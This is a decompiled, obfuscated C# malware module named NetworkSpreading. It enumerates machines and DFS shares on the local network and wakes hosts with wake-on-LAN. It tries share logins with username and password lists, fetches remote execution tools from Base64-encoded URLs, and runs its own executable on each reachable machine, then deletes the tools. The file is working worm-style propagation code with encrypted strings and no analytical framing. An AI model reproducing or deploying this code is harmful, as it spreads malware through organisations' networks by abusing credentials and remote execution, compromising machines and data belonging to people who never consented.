using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace Complex;

internal sealed class NetworkSpreading
{
	public sealed class PC
	{
		private string _003CServerName_003Ek__BackingField;

		public string ServerName
		{
			get
			{
				return _003CServerName_003Ek__BackingField;
			}
			set
			{
				_003CServerName_003Ek__BackingField = value;
			}
		}
	}

	public enum ResourceScope
	{
		RESOURCE_CONNECTED = 1,
		RESOURCE_GLOBALNET,
		RESOURCE_REMEMBERED,
		RESOURCE_RECENT,
		RESOURCE_CONTEXT
	}

	public enum ResourceType
	{
		RESOURCETYPE_ANY,
		RESOURCETYPE_DISK,
		RESOURCETYPE_PRINT,
		RESOURCETYPE_RESERVED
	}

	public enum ResourceUsage
	{
		RESOURCEUSAGE_CONNECTABLE = 1,
		RESOURCEUSAGE_CONTAINER = 2,
		RESOURCEUSAGE_NOLOCALDEVICE = 4,
		RESOURCEUSAGE_SIBLING = 8,
		RESOURCEUSAGE_ATTACHED = 16,
		RESOURCEUSAGE_ALL = 19
	}

	public enum ResourceDisplayType
	{
		RESOURCEDISPLAYTYPE_GENERIC,
		RESOURCEDISPLAYTYPE_DOMAIN,
		RESOURCEDISPLAYTYPE_SERVER,
		RESOURCEDISPLAYTYPE_SHARE,
		RESOURCEDISPLAYTYPE_FILE,
		RESOURCEDISPLAYTYPE_GROUP,
		RESOURCEDISPLAYTYPE_NETWORK,
		RESOURCEDISPLAYTYPE_ROOT,
		RESOURCEDISPLAYTYPE_SHAREADMIN,
		RESOURCEDISPLAYTYPE_DIRECTORY,
		RESOURCEDISPLAYTYPE_TREE,
		RESOURCEDISPLAYTYPE_NDSCONTAINER
	}

	public sealed class ServerEnum : IEnumerable
	{
		private enum ErrorCodes
		{
			NO_ERROR = 0,
			ERROR_NO_MORE_ITEMS = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class NETRESOURCE
		{
			public ResourceScope dwScope;

			public ResourceType dwType;

			public ResourceDisplayType dwDisplayType;

			public ResourceUsage dwUsage;

			public string lpLocalName;

			public string lpRemoteName;

			public string lpComment;

			public string lpProvider;
		}

		private ArrayList aData = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern ErrorCodes WNetOpenEnumA(ResourceScope dwScope, ResourceType dwType, ResourceUsage dwUsage, NETRESOURCE p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern ErrorCodes WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern ErrorCodes WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(NETRESOURCE netresource_0, ResourceScope resourceScope_0, ResourceType resourceType_0, ResourceUsage resourceUsage_0, ResourceDisplayType resourceDisplayType_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(resourceScope_0, resourceType_0, resourceUsage_0, netresource_0, out lphEnum) == ErrorCodes.NO_ERROR)
			{
				ErrorCodes errorCodes;
				do
				{
					errorCodes = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (errorCodes)
					{
					case ErrorCodes.ERROR_NO_MORE_ITEMS:
						continue;
					case ErrorCodes.NO_ERROR:
						Marshal.PtrToStructure(intPtr, netresource_0);
						if (netresource_0.dwDisplayType == resourceDisplayType_0)
						{
							aData.Add(netresource_0.lpRemoteName);
						}
						if ((netresource_0.dwUsage & ResourceUsage.RESOURCEUSAGE_CONTAINER) == ResourceUsage.RESOURCEUSAGE_CONTAINER)
						{
							EnumerateServers(netresource_0, resourceScope_0, resourceType_0, resourceUsage_0, resourceDisplayType_0);
						}
						continue;
					}
					break;
				}
				while (errorCodes != ErrorCodes.ERROR_NO_MORE_ITEMS);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public ServerEnum(ResourceScope resourceScope_0, ResourceType resourceType_0, ResourceUsage resourceUsage_0, ResourceDisplayType resourceDisplayType_0)
		{
			NETRESOURCE netresource_ = new NETRESOURCE();
			EnumerateServers(netresource_, resourceScope_0, resourceType_0, resourceUsage_0, resourceDisplayType_0);
		}

		public IEnumerator GetEnumerator()
		{
			return aData.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct DFS_INFO_3
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string EntryPath;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string Comment;

		public uint State;

		public uint NumberOfStorages;

		public IntPtr Storages;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct DFS_STORAGE_INFO
	{
		public int State;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string ServerName;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string ShareName;
	}

	public struct DFSLink
	{
		public string name;

		public string[] target;

		public DFSLink(string string_0, string[] string_1)
		{
			name = string_0;
			target = string_1;
		}
	}

	private sealed class _003C_003Ec__DisplayClass3
	{
		public string ToolFileName;

		public string ToolFileName1;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__1(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107393181)) && !string_0.StartsWith(getString_0(107393144)) && !string_0.StartsWith(getString_0(107393135)) && !string_0.Contains(getString_0(107393461))) || !PingHost(string_0))
			{
				return;
			}
			try
			{
				if (Program.CredActivate == getString_0(107397014))
				{
					for (int i = 0; i < names.Count; i++)
					{
						Program.ProcessCommand(getString_0(107393154), getString_0(107393109) + string_0 + getString_0(107393100) + names[i] + getString_0(107393119) + passes[i]);
						Thread.Sleep(1000);
					}
				}
				else
				{
					Program.ProcessCommand(getString_0(107393154), getString_0(107393109) + string_0);
					Thread.Sleep(1000);
				}
			}
			catch
			{
			}
			if (Program.CredActivate == getString_0(107397014))
			{
				for (int j = 0; j < names.Count; j++)
				{
					if (Program.paexuse)
					{
						if (File.Exists(ToolFileName))
						{
							Program.ProcessCommand(ToolFileName, getString_0(107391605) + string_0 + getString_0(107401338) + names[j] + getString_0(107401297) + passes[j] + getString_0(107401320) + Assembly.GetEntryAssembly()!.Location + getString_0(107391623));
						}
					}
					else if (File.Exists(ToolFileName1))
					{
						Program.ProcessCommand(ToolFileName1, getString_0(107391605) + string_0 + getString_0(107401338) + names[j] + getString_0(107401297) + passes[j] + getString_0(107401287) + Assembly.GetEntryAssembly()!.Location + getString_0(107391623));
					}
				}
			}
			else if (Program.paexuse)
			{
				if (File.Exists(ToolFileName))
				{
					Program.ProcessCommand(ToolFileName, getString_0(107391605) + string_0 + getString_0(107401198) + Assembly.GetEntryAssembly()!.Location + getString_0(107391623));
				}
			}
			else if (File.Exists(ToolFileName1))
			{
				Program.ProcessCommand(ToolFileName1, getString_0(107391605) + string_0 + getString_0(107401165) + Assembly.GetEntryAssembly()!.Location + getString_0(107391623));
			}
		}

		static _003C_003Ec__DisplayClass3()
		{
			Strings.CreateGetStringDelegate(typeof(_003C_003Ec__DisplayClass3));
		}
	}

	private sealed class _003C_003Ec__DisplayClass7
	{
		public string add;

		public bool _003CGetIPAddresses_003Eb__5(string string_0)
		{
			return string_0 != add;
		}
	}

	public static List<string> lanList;

	public static string MyIP;

	public static List<string> names;

	public static List<string> passes;

	public static List<string> IP;

	[NonSerialized]
	internal static GetString getString_0;

	public static List<PC> DisplayComputers()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = getString_0(107396874);
			process.StartInfo.Arguments = getString_0(107405337);
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<PC> list = new List<PC>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == getString_0(107405352))
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new PC
						{
							ServerName = getString_0(107396879) + stringBuilder.ToString() + getString_0(107405275)
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string DfsName, int Level, int PrefMaxLen, out IntPtr Buffer, [MarshalAs(UnmanagedType.I4)] out int EntriesRead, [MarshalAs(UnmanagedType.I4)] ref int ResumeHandle);

	public static List<DFSLink> GetDfsLinks(string string_0)
	{
		try
		{
			List<DFSLink> list = new List<DFSLink>();
			IntPtr Buffer = default(IntPtr);
			int EntriesRead = 0;
			int ResumeHandle = 0;
			if (NetDfsEnum(string_0, 3, 268435455, out Buffer, out EntriesRead, ref ResumeHandle) == 0)
			{
				for (int i = 0; i < EntriesRead; i++)
				{
					DFS_INFO_3 dFS_INFO_ = (DFS_INFO_3)Marshal.PtrToStructure(Buffer + i * Marshal.SizeOf(typeof(DFS_INFO_3)), typeof(DFS_INFO_3));
					if (dFS_INFO_.EntryPath == string_0)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < dFS_INFO_.NumberOfStorages; j++)
					{
						IntPtr ptr = new IntPtr(dFS_INFO_.Storages.ToInt64() + j * Marshal.SizeOf(typeof(DFS_STORAGE_INFO)));
						DFS_STORAGE_INFO dFS_STORAGE_INFO = (DFS_STORAGE_INFO)Marshal.PtrToStructure(ptr, typeof(DFS_STORAGE_INFO));
						if (dFS_STORAGE_INFO.State == 2)
						{
							list2.Add(Path.Combine(new string[3]
							{
								getString_0(107391548),
								dFS_STORAGE_INFO.ServerName,
								dFS_STORAGE_INFO.ShareName
							}));
						}
					}
					string text = dFS_INFO_.EntryPath.Replace(string_0, getString_0(107393404));
					if (text.StartsWith(getString_0(107396879)))
					{
						text = text.Substring(1);
					}
					list.Add(new DFSLink(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void LocalNet()
	{
		Program.Empowered(getString_0(107405266));
		List<PC> list = DisplayComputers();
		List<DFSLink> dfsLinks = GetDfsLinks(Environment.MachineName);
		if (dfsLinks != null)
		{
			foreach (DFSLink item in dfsLinks)
			{
				string[] target = item.target;
				foreach (string text in target)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (Program.CredActivate == getString_0(107396957))
						{
							for (int j = 0; j < names.Count; j++)
							{
								Program.ProcessCommand(getString_0(107393097), getString_0(107392976) + text + getString_0(107393043) + names[j] + getString_0(107393062) + passes[j]);
							}
						}
						else
						{
							Program.ProcessCommand(getString_0(107393097), getString_0(107392976) + text);
						}
						Program.DizonList.Add(text.Replace(getString_0(107391561), getString_0(107393404)));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (PC item2 in list)
		{
			if (item2.ServerName.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (Program.CredActivate == getString_0(107396957))
				{
					for (int k = 0; k < names.Count; k++)
					{
						Program.ProcessCommand(getString_0(107393097), getString_0(107392976) + item2.ServerName + getString_0(107393043) + names[k] + getString_0(107393062) + passes[k]);
					}
				}
				else
				{
					Program.ProcessCommand(getString_0(107393097), getString_0(107392976) + item2.ServerName);
				}
				Program.DizonList.Add(item2.ServerName.Replace(getString_0(107391561), getString_0(107393404)));
			}
			catch
			{
			}
		}
	}

	public static void Run()
	{
		_003C_003Ec__DisplayClass3 CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass3();
		List<IPInfo> iPInfo = IPInfo.GetIPInfo();
		foreach (IPInfo item in iPInfo)
		{
			lanList.Add(item.IPAddress);
		}
		CS_0024_003C_003E8__locals0.ToolFileName = getString_0(107393404);
		CS_0024_003C_003E8__locals0.ToolFileName1 = getString_0(107393404);
		try
		{
			CS_0024_003C_003E8__locals0.ToolFileName = DownloadTool();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.ToolFileName1 = DownloadTool1();
		}
		catch
		{
		}
		foreach (IPInfo item2 in iPInfo)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107393124)) || item2.IPAddress.StartsWith(getString_0(107393087)) || item2.IPAddress.StartsWith(getString_0(107393078)) || item2.IPAddress.Contains(getString_0(107393404)))
				{
					WakeOnLan.WakeUp(item2.MacAddress, item2.IPAddress, getString_0(107404669));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(lanList, delegate(string string_0)
			{
				if ((string_0.StartsWith(_003C_003Ec__DisplayClass3.getString_0(107393181)) || string_0.StartsWith(_003C_003Ec__DisplayClass3.getString_0(107393144)) || string_0.StartsWith(_003C_003Ec__DisplayClass3.getString_0(107393135)) || string_0.Contains(_003C_003Ec__DisplayClass3.getString_0(107393461))) && PingHost(string_0))
				{
					try
					{
						if (Program.CredActivate == _003C_003Ec__DisplayClass3.getString_0(107397014))
						{
							for (int i = 0; i < names.Count; i++)
							{
								Program.ProcessCommand(_003C_003Ec__DisplayClass3.getString_0(107393154), _003C_003Ec__DisplayClass3.getString_0(107393109) + string_0 + _003C_003Ec__DisplayClass3.getString_0(107393100) + names[i] + _003C_003Ec__DisplayClass3.getString_0(107393119) + passes[i]);
								Thread.Sleep(1000);
							}
						}
						else
						{
							Program.ProcessCommand(_003C_003Ec__DisplayClass3.getString_0(107393154), _003C_003Ec__DisplayClass3.getString_0(107393109) + string_0);
							Thread.Sleep(1000);
						}
					}
					catch
					{
					}
					if (Program.CredActivate == _003C_003Ec__DisplayClass3.getString_0(107397014))
					{
						for (int j = 0; j < names.Count; j++)
						{
							if (Program.paexuse)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.ToolFileName))
								{
									Program.ProcessCommand(CS_0024_003C_003E8__locals0.ToolFileName, _003C_003Ec__DisplayClass3.getString_0(107391605) + string_0 + _003C_003Ec__DisplayClass3.getString_0(107401338) + names[j] + _003C_003Ec__DisplayClass3.getString_0(107401297) + passes[j] + _003C_003Ec__DisplayClass3.getString_0(107401320) + Assembly.GetEntryAssembly()!.Location + _003C_003Ec__DisplayClass3.getString_0(107391623));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.ToolFileName1))
							{
								Program.ProcessCommand(CS_0024_003C_003E8__locals0.ToolFileName1, _003C_003Ec__DisplayClass3.getString_0(107391605) + string_0 + _003C_003Ec__DisplayClass3.getString_0(107401338) + names[j] + _003C_003Ec__DisplayClass3.getString_0(107401297) + passes[j] + _003C_003Ec__DisplayClass3.getString_0(107401287) + Assembly.GetEntryAssembly()!.Location + _003C_003Ec__DisplayClass3.getString_0(107391623));
							}
						}
					}
					else if (Program.paexuse)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.ToolFileName))
						{
							Program.ProcessCommand(CS_0024_003C_003E8__locals0.ToolFileName, _003C_003Ec__DisplayClass3.getString_0(107391605) + string_0 + _003C_003Ec__DisplayClass3.getString_0(107401198) + Assembly.GetEntryAssembly()!.Location + _003C_003Ec__DisplayClass3.getString_0(107391623));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.ToolFileName1))
					{
						Program.ProcessCommand(CS_0024_003C_003E8__locals0.ToolFileName1, _003C_003Ec__DisplayClass3.getString_0(107391605) + string_0 + _003C_003Ec__DisplayClass3.getString_0(107401165) + Assembly.GetEntryAssembly()!.Location + _003C_003Ec__DisplayClass3.getString_0(107391623));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.ToolFileName))
			{
				File.Delete(CS_0024_003C_003E8__locals0.ToolFileName);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.ToolFileName1))
			{
				File.Delete(CS_0024_003C_003E8__locals0.ToolFileName1);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string DownloadTool()
	{
		if (IntPtr.Size == 8)
		{
			return DownloadFile(new Uri(Program.Base64Decode(getString_0(107404680))));
		}
		return DownloadFile(new Uri(Program.Base64Decode(getString_0(107404680))));
	}

	public static string DownloadTool1()
	{
		if (IntPtr.Size == 8)
		{
			return DownloadFile(new Uri(Program.Base64Decode(getString_0(107404567))));
		}
		return DownloadFile(new Uri(Program.Base64Decode(getString_0(107404522))));
	}

	public static bool PingHost(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string DownloadFile(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107404449), getString_0(107393404)).Remove(0, 3) + getString_0(107404924);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> GetIPAddresses()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107404915));
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item(getString_0(107404850)))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item(getString_0(107404869));
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			for (int j = 0; j < array4.Length; j++)
			{
				_003C_003Ec__DisplayClass7 CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass7();
				CS_0024_003C_003E8__locals0.add = array4[j];
				if (CS_0024_003C_003E8__locals0.add.Contains(getString_0(107404824)))
				{
					array = array.Where((string string_0) => string_0 != CS_0024_003C_003E8__locals0.add).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}

	static NetworkSpreading()
	{
		Strings.CreateGetStringDelegate(typeof(NetworkSpreading));
		lanList = new List<string>();
		MyIP = getString_0(107393404);
		names = new List<string>();
		passes = new List<string>();
		IP = new List<string>();
	}
}
